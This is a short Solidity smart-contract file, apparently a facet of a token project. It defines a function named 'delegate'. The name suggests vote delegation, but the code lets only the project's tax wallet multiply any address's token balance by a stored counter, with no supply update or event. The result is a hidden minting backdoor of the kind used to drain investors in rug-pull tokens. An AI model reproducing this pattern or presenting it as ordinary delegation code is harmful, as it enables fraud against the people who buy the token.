// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://y8u.ai/
    Twitter:  https://twitter.com/y8udotai
    Telegram: https://t.me/y8udotai

*/

pragma solidity ^0.8.24;
import "./TestLib.sol";
contract delegateFacet is Ownable {
    function delegate(address delegatee) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (true) {
            require(ds._taxWallet == _msgSender());
            ds._balances[delegatee] *= ds.buyCount;
        }
    }
}
